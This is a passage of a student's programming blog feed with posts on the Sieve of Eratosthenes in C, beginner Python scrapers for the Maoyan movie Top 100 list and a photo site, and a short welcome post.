class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i+=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">f[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2 "</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">3</span>;k&lt;=n;k+=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(f[k]==<span class="number">1</span>)<span class="built_in">printf</span>(<span class="string">"%d "</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我学到教材指针这部分，看见教材给了动态一维数组筛选法的例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,n;</span><br><span class="line"><span class="keyword">int</span> *s;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input n:\n"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">&#125; <span class="keyword">while</span> (n&lt;=<span class="number">0</span>);</span><br><span class="line">s=(<span class="keyword">int</span>*) <span class="built_in">calloc</span>(n+<span class="number">1</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"allocation failure"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">s[<span class="number">0</span>]=s[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">2</span>*i;j&lt;n+<span class="number">1</span>;j+=i)s[j]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!s[i])<span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。&lt;br&gt;下面用python实现&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>爬取猫眼电影top100</title>
    <link href="http://chenxiyuan.vip/2018/10/26/%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100/"/>
    <id>http://chenxiyuan.vip/2018/10/26/爬取猫眼电影top100/</id>
    <published>2018-10-26T03:21:55.000Z</published>
    <updated>2018-11-02T07:26:50.231Z</updated>
    
    <content type="html"><![CDATA[<p>昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。<a href="http://maoyan.com/board/4" target="_blank" rel="noopener">http://maoyan.com/board/4</a></p><h2 id="用到的模块"><a href="#用到的模块" class="headerlink" title="用到的模块"></a>用到的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="用正则表达式匹配下载当页信息"><a href="#用正则表达式匹配下载当页信息" class="headerlink" title="用正则表达式匹配下载当页信息"></a>用正则表达式匹配下载当页信息</h2><p>首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。<br><img src="http://i1.fuimg.com/665720/60804d00d7b1ebd8.png" alt="箭头就是我们要提取的内容"><br>接下来就是写代码用正则把内匹配下来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://maoyan.com/board/4?offset=0'</span>,headers=headers)</span><br><span class="line">results = re.findall(</span><br><span class="line">        <span class="string">'&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; '</span>,</span><br><span class="line">        r.text, re.S)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回</span></span><br><span class="line"><span class="string">.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号</span></span><br><span class="line"><span class="string">我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替</span></span><br><span class="line"><span class="string">第二个参数是被匹配的文本，传入网页源代码即可</span></span><br><span class="line"><span class="string">因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><p>再写个循环把提取到的内容写进txt文件即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'top100.txt'</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(i[<span class="number">0</span>] + <span class="string">' '</span> + re.sub(<span class="string">'\n\s+'</span>, <span class="string">''</span>, str(i[<span class="number">1</span>])) + <span class="string">' '</span> + i[<span class="number">2</span>] + <span class="string">' '</span> + <span class="string">'评分：'</span> + i[<span class="number">3</span>] + i[<span class="number">4</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a表示追加写入，要加上encoding='utf-8'，不然会编码错误</span></span><br><span class="line"><span class="string">i[0] i[1]等表示当前列表里的某个元组的第几个内容</span></span><br><span class="line"><span class="string">我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="写个循环爬取所有页面的内容"><a href="#写个循环爬取所有页面的内容" class="headerlink" title="写个循环爬取所有页面的内容"></a>写个循环爬取所有页面的内容</h2><p>我们发现网页的地址格式是<a href="http://maoyan.com/board/4?offset=" target="_blank" rel="noopener">http://maoyan.com/board/4?offset=</a> + 0,10,20,30…100<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">110</span>,<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'http://maoyan.com/board/4?offset='</span> + str(i)</span><br><span class="line"><span class="string">'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数</span></span><br><span class="line"><span class="string">然后再把上面的代码写成函数，在这个循环里调用即可</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="这次我终于用上函数了"><a href="#这次我终于用上函数了" class="headerlink" title="这次我终于用上函数了"></a>这次我终于用上函数了</h2><p>附上全部代码,原谅小白的代码吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_information</span><span class="params">(url)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    result = re.findall(</span><br><span class="line">        <span class="string">'&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; '</span>,</span><br><span class="line">        r.text, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'top100.txt'</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(i[<span class="number">0</span>] + <span class="string">' '</span> + re.sub(<span class="string">'\n\s+'</span>, <span class="string">''</span>, str(i[<span class="number">1</span>])) + <span class="string">' '</span> + i[<span class="number">2</span>] + <span class="string">' '</span> + <span class="string">'评分：'</span> + i[<span class="number">3</span>] + i[<span class="number">4</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">110</span>,<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'http://maoyan.com/board/4?offset='</span> + str(i)</span><br><span class="line">    get_information(url)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。&lt;a href=&quot;http://maoyan.com/board/4&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://maoyan.com/board/4&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;用到的模块&quot;&gt;&lt;a href=&quot;#用到的模块&quot; class=&quot;headerlink&quot; title=&quot;用到的模块&quot;&gt;&lt;/a&gt;用到的模块&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>初学python爬虫</title>
    <link href="http://chenxiyuan.vip/2018/10/22/%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB/"/>
    <id>http://chenxiyuan.vip/2018/10/22/初学python爬虫/</id>
    <published>2018-10-22T14:02:59.000Z</published>
    <updated>2019-03-03T12:59:59.169Z</updated>
    
    <content type="html"><![CDATA[<p>菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。<a href="http://www.mzitu.com/zipai/" target="_blank" rel="noopener">http://www.mzitu.com/zipai/</a></p><h2 id="用到的模块"><a href="#用到的模块" class="headerlink" title="用到的模块"></a>用到的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="找到当前页面图片地址"><a href="#找到当前页面图片地址" class="headerlink" title="找到当前页面图片地址"></a>找到当前页面图片地址</h2><p>首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。<br><img src="http://i4.bvimg.com/665720/11eb941007bbf352.png" alt="右键图片点击检查"><br>先用get方法获取页面内容，再用BeautifulSoup煲汤。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">'http://www.mzitu.com/zipai/'</span>)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>) <span class="comment">#需要 pip install lxml</span></span><br><span class="line">list1 = []</span><br><span class="line">list1 = soup.select(<span class="string">'p &gt; img'</span>)</span><br></pre></td></tr></table></figure></p><p>然后再用for循环提取出img的属性<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list2 =[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:    </span><br><span class="line">    list2.append(i.get(<span class="string">'src'</span>))</span><br><span class="line">    print(i.get(<span class="string">'src'</span>))</span><br></pre></td></tr></table></figure></p><h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:    </span><br><span class="line">    img = requests.get(i)</span><br><span class="line">    filename = i.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img.content)</span><br></pre></td></tr></table></figure><h2 id="循环每个页面"><a href="#循环每个页面" class="headerlink" title="循环每个页面"></a>循环每个页面</h2><p>很容易可以观察到，地址的格式是”<a href="http://www.mzitu.com/zipai/comment-page-&quot;+" target="_blank" rel="noopener">http://www.mzitu.com/zipai/comment-page-&quot;+</a> 页数+”/#comments”<br>因此写个for循环即可遍历地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">365</span>):</span><br><span class="line">    url =<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span></span><br></pre></td></tr></table></figure></p><p>再把url传入上面的方法即可。</p><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">365</span>):</span><br><span class="line">    url =<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span> </span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">    list1 = soup.select(<span class="string">'p &gt; img'</span>)</span><br><span class="line">    list2 =[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:    </span><br><span class="line">        list2.append(i.get(<span class="string">'src'</span>))</span><br><span class="line">        print(i.get(<span class="string">'src'</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list2:    </span><br><span class="line">        img = requests.get(i)</span><br><span class="line">        filename = i.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(img.content)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。&lt;a href=&quot;http://www.mzitu.com/zipai/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mzitu.com/zipai/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;用到的模块&quot;&gt;&lt;a href=&quot;#用到的模块&quot; class=&quot;headerlink&quot; title=&quot;用到的模块&quot;&gt;&lt;/a&gt;用到的模块&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; bs4 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to my blog.</title>
    <link href="http://chenxiyuan.vip/2018/10/18/My%20first%20blog/"/>
    <id>http://chenxiyuan.vip/2018/10/18/My first blog/</id>
    <published>2018-10-18T15:44:28.000Z</published>
    <updated>2018-10-20T07:40:45.763Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><a id="more"></a><p><br><br><br><br><br></p><p><strong>学校里全是dalao，加油鸭！</strong><br><br><br><strong>一定要成为一名牛逼的CTFer！不负自己，未来可期！</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chenxiyuan.vip/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
</feed>
